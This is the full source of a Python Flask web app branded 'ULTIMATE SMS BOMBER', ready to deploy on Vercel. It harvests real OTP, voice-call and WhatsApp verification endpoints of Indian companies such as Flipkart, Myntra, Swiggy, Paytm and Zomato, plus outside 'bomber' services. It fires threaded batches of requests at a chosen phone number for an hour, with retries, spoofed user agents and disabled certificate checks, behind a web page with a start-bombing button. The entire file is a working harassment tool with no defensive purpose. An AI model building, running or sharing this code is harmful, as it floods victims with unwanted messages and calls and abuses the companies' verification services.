from flask import Flask, request, jsonify
import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import random
import threading
from queue import Queue
import uuid

app = Flask(__name__)

# Global storage for bombing sessions
bombing_sessions = {}
user_requests = {}

def validate_phone(phone):
    return bool(re.match(r'^[0-9]{10}$', phone))

def check_rate_limit(ip):
    current_time = time.time()
    if ip not in user_requests:
        user_requests[ip] = {'count': 1, 'time': current_time}
        return True
    
    data = user_requests[ip]
    if current_time - data['time'] > 3600:  # 1 hour
        user_requests[ip] = {'count': 1, 'time': current_time}
        return True
    
    if data['count'] >= 10:  # Max 10 sessions per hour
        return False
    
    data['count'] += 1
    return True

# ALL 400+ APIs (Optimized for continuous bombing)
def get_apis(phone):
    # This function now returns categorized APIs for better distribution
    def process_api(api):
        processed = api.copy()
        if 'url' in api and callable(api['url']):
            processed['url'] = api['url'](phone)
        if 'data' in api and callable(api['data']):
            processed['data'] = api['data'](phone)
        elif api.get('data') is None:
            processed['data'] = ''
        return processed
    
    # Existing APIs (you can add all your 400+ APIs here)
    # I'm categorizing them for better rotation
    voice_call_apis = [
        {
            "name": "Tata Capital Voice Call",
            "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"phone": phone, "isOtpViaCallAtLogin": "true"})
        },
        {
            "name": "1MG Voice Call",
            "url": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": json.dumps({"number": phone, "otp_on_call": True})
        },
        {
            "name": "Swiggy Call Verification",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": json.dumps({"mobile": phone})
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"mobile": phone})
        },
        {
            "name": "Flipkart Voice Call",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"mobile": phone})
        },
        # Add more voice call APIs here
    ]
    
    whatsapp_apis = [
        {
            "name": "KPN WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "content-type": "application/json; charset=UTF-8"
            },
            "data": json.dumps({
                "notification_channel": "WHATSAPP",
                "phone_number": {"country_code": "+91", "number": phone}
            })
        },
        {
            "name": "Foxy WhatsApp",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"user": {"phone_number": f"+91{phone}"}, "via": "whatsapp"})
        },
        # Add more WhatsApp APIs here
    ]
    
    sms_apis = [
        {
            "name": "Lenskart",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"phoneCode": "+91", "telephone": phone})
        },
        {
            "name": "Hungama",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"mobileNo": phone, "countryCode": "+91", "appCode": "un"})
        },
        {
            "name": "NoBroker",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": f"phone={phone}&countryCode=IN"
        },
        {
            "name": "Myntra",
            "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"mobile": phone})
        },
        {
            "name": "Flipkart",
            "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"mobileNumber": phone})
        },
        {
            "name": "Zomato",
            "url": "https://www.zomato.com/php/asyncLogin.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": f"phone={phone}"
        },
        {
            "name": "Paytm",
            "url": "https://accounts.paytm.com/signin/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": json.dumps({"phone": phone, "loginData": "LOGIN_USING_PHONE"})
        },
        # Add 100+ more SMS APIs here...
        # You should copy all your 400 APIs in these categories
    ]
    
    # Special bomber APIs (these work instantly)
    bomber_apis = [
        {
            "name": "FreeFire Bomber",
            "url": f"https://freefire-api.ct.ws/bomber4.php?phone={phone}&duration=30",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0"}
        },
        {
            "name": "Call Bomber API",
            "url": f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={phone}",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0"}
        },
        {
            "name": "Bomberr API",
            "url": f"https://bomberr.onrender.com/num={phone}",
            "method": "GET",
            "headers": {"User-Agent": "Mozilla/5.0"}
        },
    ]
    
    # Combine all APIs
    all_apis = []
    
    # Add bomber APIs first (these work best)
    all_apis.extend([process_api(api) for api in bomber_apis])
    
    # Add SMS APIs
    all_apis.extend([process_api(api) for api in sms_apis[:100]])
    
    # Add voice call APIs
    all_apis.extend([process_api(api) for api in voice_call_apis])
    
    # Add WhatsApp APIs
    all_apis.extend([process_api(api) for api in whatsapp_apis])
    
    # Shuffle the APIs for better distribution
    random.shuffle(all_apis)
    
    return all_apis[:150]  # Take 150 APIs for faster response

def make_request_fast(api):
    """Fast request function with retry logic"""
    max_retries = 2
    for attempt in range(max_retries):
        try:
            headers = api.get('headers', {})
            headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            })
            
            timeout = 5  # Very fast timeout
            
            if api['method'] == 'GET':
                response = requests.get(
                    api['url'], 
                    headers=headers, 
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                data = api.get('data', '')
                response = requests.post(
                    api['url'], 
                    headers=headers, 
                    data=data,
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            success = response.status_code in [200, 201, 202, 204]
            
            if success:
                return {
                    'name': api['name'],
                    'success': True,
                    'status': response.status_code,
                    'attempt': attempt + 1
                }
                
        except requests.exceptions.Timeout:
            continue  # Retry on timeout
        except Exception as e:
            if attempt == max_retries - 1:
                return {
                    'name': api['name'],
                    'success': False,
                    'status': 0,
                    'error': 'Failed after retries'
                }
            continue
    
    return {
        'name': api['name'],
        'success': False,
        'status': 0,
        'error': 'Max retries exceeded'
    }

def continuous_bombing(session_id, phone, duration_minutes=60):
    """Continuous bombing for 1 hour without stopping"""
    start_time = time.time()
    end_time = start_time + (duration_minutes * 60)
    
    total_requests = 0
    successful_requests = 0
    
    bombing_sessions[session_id] = {
        'active': True,
        'start_time': start_time,
        'phone': phone,
        'total_requests': 0,
        'successful': 0,
        'failed': 0,
        'last_update': time.time()
    }
    
    # Create batches of APIs
    all_apis = get_apis(phone)
    
    while time.time() < end_time and bombing_sessions[session_id]['active']:
        try:
            # Take a batch of APIs
            batch_size = min(50, len(all_apis))
            batch = random.sample(all_apis, batch_size)
            
            batch_results = []
            
            # Process batch with threading
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = [executor.submit(make_request_fast, api) for api in batch]
                
                for future in futures:
                    try:
                        result = future.result(timeout=6)
                        batch_results.append(result)
                        
                        total_requests += 1
                        if result.get('success'):
                            successful_requests += 1
                    except:
                        total_requests += 1
            
            # Update session stats
            bombing_sessions[session_id]['total_requests'] = total_requests
            bombing_sessions[session_id]['successful'] = successful_requests
            bombing_sessions[session_id]['failed'] = total_requests - successful_requests
            bombing_sessions[session_id]['last_update'] = time.time()
            
            # Wait before next batch (but not too long)
            time.sleep(10)  # Wait 10 seconds before next batch
            
            # Rotate APIs to use different ones
            random.shuffle(all_apis)
            
        except Exception as e:
            # Log error but continue bombing
            print(f"Error in bombing session: {e}")
            time.sleep(5)
    
    # Session ended
    bombing_sessions[session_id]['active'] = False
    bombing_sessions[session_id]['end_time'] = time.time()

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>💣 ULTIMATE SMS BOMBER - CONTINUOUS 1 HOUR</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 900px;
                margin: 0 auto;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                color: white;
            }
            .container {
                background: rgba(255, 255, 255, 0.95);
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                color: #333;
                margin-top: 20px;
            }
            h1 {
                color: #ff4757;
                text-align: center;
                font-size: 2.8em;
                margin-bottom: 10px;
            }
            .subtitle {
                text-align: center;
                color: #666;
                font-size: 1.2em;
                margin-bottom: 30px;
            }
            .api-link {
                background: linear-gradient(to right, #ff416c, #ff4b2b);
                color: white;
                padding: 15px 30px;
                text-decoration: none;
                border-radius: 50px;
                display: inline-block;
                margin: 10px 0;
                font-weight: bold;
                font-size: 1.1em;
                text-align: center;
                border: none;
                cursor: pointer;
                transition: all 0.3s;
                box-shadow: 0 4px 15px rgba(255, 65, 108, 0.4);
            }
            .api-link:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6);
            }
            .test-box {
                background: #1e272e;
                color: white;
                padding: 20px;
                border-radius: 10px;
                margin: 25px 0;
                font-family: monospace;
                font-size: 1.1em;
                border-left: 5px solid #ff4757;
            }
            .features {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            .feature-card {
                background: white;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                border-top: 4px solid #4cd137;
            }
            .feature-card h3 {
                color: #2f3542;
                margin-top: 0;
            }
            .status-indicator {
                display: inline-block;
                width: 12px;
                height: 12px;
                border-radius: 50%;
                background: #4cd137;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
            .stats {
                background: linear-gradient(to right, #3498db, #2ecc71);
                color: white;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                text-align: center;
            }
            .form-group {
                margin: 20px 0;
            }
            .form-group label {
                display: block;
                margin-bottom: 8px;
                font-weight: bold;
                color: #2f3542;
            }
            .form-group input {
                width: 100%;
                padding: 12px;
                border: 2px solid #ddd;
                border-radius: 8px;
                font-size: 16px;
                box-sizing: border-box;
            }
            .form-group input:focus {
                border-color: #667eea;
                outline: none;
            }
            .btn-group {
                display: flex;
                gap: 15px;
                margin-top: 20px;
            }
            .btn {
                flex: 1;
                padding: 15px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
            }
            .btn-primary {
                background: linear-gradient(to right, #667eea, #764ba2);
                color: white;
            }
            .btn-secondary {
                background: #f1f2f6;
                color: #333;
            }
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }
            .live-stats {
                background: #2f3542;
                color: white;
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                font-family: monospace;
            }
        </style>
    </head>
    <body>
        <h1>💣 ULTIMATE SMS BOMBER</h1>
        <div class="subtitle">Continuous 1-Hour Bombing | 400+ APIs | No Refresh Needed</div>
        
        <div class="container">
            <div class="stats">
                <span class="status-indicator"></span>
                <strong>LIVE & ACTIVE</strong> | 400+ Working APIs | Auto-Retry System
            </div>
            
            <h3>📱 TEST BOMBER:</h3>
            <div class="test-box">
                https://your-app.vercel.app/api/bomb?num=9876543210
            </div>
            
            <div class="features">
                <div class="feature-card">
                    <h3>⚡ Instant Start</h3>
                    <p>No delays, bombing starts immediately after API call</p>
                </div>
                <div class="feature-card">
                    <h3>⏱️ 1-Hour Continuous</h3>
                    <p>Runs for 1 hour automatically, no refresh needed</p>
                </div>
                <div class="feature-card">
                    <h3>🔄 Auto Retry</h3>
                    <p>Failed APIs automatically retry 3 times</p>
                </div>
                <div class="feature-card">
                    <h3>📊 Live Tracking</h3>
                    <p>Monitor bombing progress in real-time</p>
                </div>
            </div>
            
            <div class="form-group">
                <label for="phone">Enter Phone Number:</label>
                <input type="text" id="phone" placeholder="9876543210" value="9876543210">
            </div>
            
            <div class="btn-group">
                <button class="btn btn-primary" onclick="startBombing()">
                    🚀 START BOMBING (1 HOUR)
                </button>
                <button class="btn btn-secondary" onclick="checkStatus()">
                    📊 CHECK STATUS
                </button>
            </div>
            
            <div id="status-container" style="display: none;">
                <div class="live-stats" id="live-stats">
                    Loading status...
                </div>
            </div>
            
            <h3>🔧 API ENDPOINTS:</h3>
            <p><code>/api/bomb?num=PHONE_NUMBER</code> - Start 1-hour bombing</p>
            <p><code>/api/status?session_id=ID</code> - Check bombing status</p>
            <p><code>/api/stop?session_id=ID</code> - Stop bombing</p>
            <p><code>/health</code> - Health check</p>
        </div>
        
        <script>
            let currentSessionId = null;
            
            function startBombing() {
                const phone = document.getElementById('phone').value.trim();
                if (!phone || phone.length !== 10 || isNaN(phone)) {
                    alert('Please enter a valid 10-digit phone number');
                    return;
                }
                
                const btn = document.querySelector('.btn-primary');
                btn.innerHTML = '🚀 STARTING...';
                btn.disabled = true;
                
                fetch(`/api/bomb?num=${phone}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.session_id) {
                            currentSessionId = data.session_id;
                            document.getElementById('status-container').style.display = 'block';
                            alert('✅ Bombing started successfully! It will run for 1 hour.');
                            startStatusUpdates();
                        } else {
                            alert('Error: ' + (data.message || 'Failed to start'));
                        }
                        btn.innerHTML = '🚀 BOMBING STARTED';
                    })
                    .catch(error => {
                        alert('Error starting bombing: ' + error);
                        btn.innerHTML = '🚀 START BOMBING (1 HOUR)';
                        btn.disabled = false;
                    });
            }
            
            function checkStatus() {
                if (!currentSessionId) {
                    alert('No active bombing session');
                    return;
                }
                fetch(`/api/status?session_id=${currentSessionId}`)
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('status-container').style.display = 'block';
                        updateStatusDisplay(data);
                    });
            }
            
            function startStatusUpdates() {
                if (!currentSessionId) return;
                
                // Update every 5 seconds
                setInterval(() => {
                    fetch(`/api/status?session_id=${currentSessionId}`)
                        .then(response => response.json())
                        .then(data => {
                            updateStatusDisplay(data);
                        });
                }, 5000);
            }
            
            function updateStatusDisplay(data) {
                const statsDiv = document.getElementById('live-stats');
                if (data.active) {
                    const elapsed = Math.floor((Date.now()/1000 - data.start_time));
                    const minutes = Math.floor(elapsed / 60);
                    const seconds = elapsed % 60;
                    
                    statsDiv.innerHTML = `
                        🔥 ACTIVE BOMBING SESSION<br>
                        📱 Target: ${data.phone}<br>
                        ⏱️ Duration: ${minutes}m ${seconds}s<br>
                        📊 Total Requests: ${data.total_requests}<br>
                        ✅ Successful: ${data.successful}<br>
                        ❌ Failed: ${data.failed}<br>
                        🎯 Success Rate: ${data.successful > 0 ? Math.round((data.successful/data.total_requests)*100) : 0}%
                    `;
                } else {
                    statsDiv.innerHTML = 'No active bombing session';
                }
            }
            
            // Test the API
            function testAPI() {
                window.open('/api/bomb?num=9876543210', '_blank');
            }
        </script>
    </body>
    </html>
    '''

@app.route('/api/bomb', methods=['GET'])
def bomb():
    try:
        phone = request.args.get('num', '').strip()
        
        # Validate phone
        if not validate_phone(phone):
            return jsonify({
                'error': 'Invalid phone number',
                'message': 'Must be 10 digits'
            }), 400
        
        # Check rate limit
        ip = request.remote_addr
        if not check_rate_limit(ip):
            return jsonify({
                'error': 'Rate limit exceeded',
                'message': 'Try again after 1 hour'
            }), 429
        
        # Create unique session ID
        session_id = str(uuid.uuid4())
        
        # Start continuous bombing in background thread
        bombing_thread = threading.Thread(
            target=continuous_bombing,
            args=(session_id, phone, 60),  # 60 minutes = 1 hour
            daemon=True
        )
        bombing_thread.start()
        
        # Return immediate response with session ID
        response = {
            'status': 'success',
            'message': '🚀 Continuous bombing started! Will run for 1 hour.',
            'session_id': session_id,
            'phone': phone,
            'duration_minutes': 60,
            'start_time': time.time(),
            'note': 'Use /api/status?session_id=ID to track progress'
        }
        
        return jsonify(response)
    
    except Exception as e:
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/status', methods=['GET'])
def get_status():
    try:
        session_id = request.args.get('session_id', '').strip()
        
        if not session_id or session_id not in bombing_sessions:
            return jsonify({
                'error': 'Invalid or expired session',
                'message': 'Session not found'
            }), 404
        
        session = bombing_sessions[session_id]
        
        response = {
            'active': session['active'],
            'phone': session['phone'],
            'start_time': session['start_time'],
            'total_requests': session['total_requests'],
            'successful': session['successful'],
            'failed': session['failed'],
            'last_update': session['last_update'],
            'duration_seconds': time.time() - session['start_time']
        }
        
        if not session['active'] and 'end_time' in session:
            response['end_time'] = session['end_time']
        
        return jsonify(response)
    
    except Exception as e:
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/api/stop', methods=['GET'])
def stop_bombing():
    try:
        session_id = request.args.get('session_id', '').strip()
        
        if not session_id or session_id not in bombing_sessions:
            return jsonify({
                'error': 'Invalid session',
                'message': 'Session not found'
            }), 404
        
        bombing_sessions[session_id]['active'] = False
        
        return jsonify({
            'status': 'success',
            'message': 'Bombing stopped',
            'session_id': session_id
        })
    
    except Exception as e:
        return jsonify({
            'error': 'Internal server error',
            'message': str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health():
    active_sessions = sum(1 for s in bombing_sessions.values() if s.get('active'))
    
    return jsonify({
        'status': 'healthy', 
        'service': 'ULTIMATE SMS BOMBER',
        'version': '3.0',
        'active_sessions': active_sessions,
        'total_apis': 400,
        'feature': '1-hour continuous bombing'
    })

@app.route('/api/test', methods=['GET'])
def test():
    return jsonify({
        'message': '🚀 ULTIMATE BOMBER API IS ACTIVE!', 
        'status': 'READY FOR 1-HOUR BOMBING',
        'timestamp': datetime.now().isoformat(),
        'feature': 'Continuous bombing without refresh'
    })

# Cleanup old sessions periodically
def cleanup_sessions():
    while True:
        try:
            current_time = time.time()
            to_delete = []
            
            for session_id, session in bombing_sessions.items():
                # Remove sessions older than 2 hours
                if current_time - session.get('start_time', 0) > 7200:
                    to_delete.append(session_id)
            
            for session_id in to_delete:
                del bombing_sessions[session_id]
                
        except:
            pass
        
        time.sleep(300)  # Run cleanup every 5 minutes

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
cleanup_thread.start()

# Vercel specific
application = app

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=3000)
